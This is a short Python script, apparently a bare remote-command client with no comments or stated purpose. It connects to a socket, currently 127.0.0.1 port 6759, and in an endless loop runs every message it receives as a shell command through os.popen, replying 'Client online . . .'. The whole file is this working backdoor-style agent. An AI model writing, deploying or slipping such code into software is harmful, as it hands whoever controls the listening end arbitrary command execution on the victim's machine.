import socket
import os

server = socket.socket()
host = '127.0.0.1'
port = 6759

run = True
server.connect((host,port))
while run:


    msg = server.recv(1024)
    os.popen(msg.decode('UTF-8'))

    server.send('Client online . . .'.encode('UTF-8'))


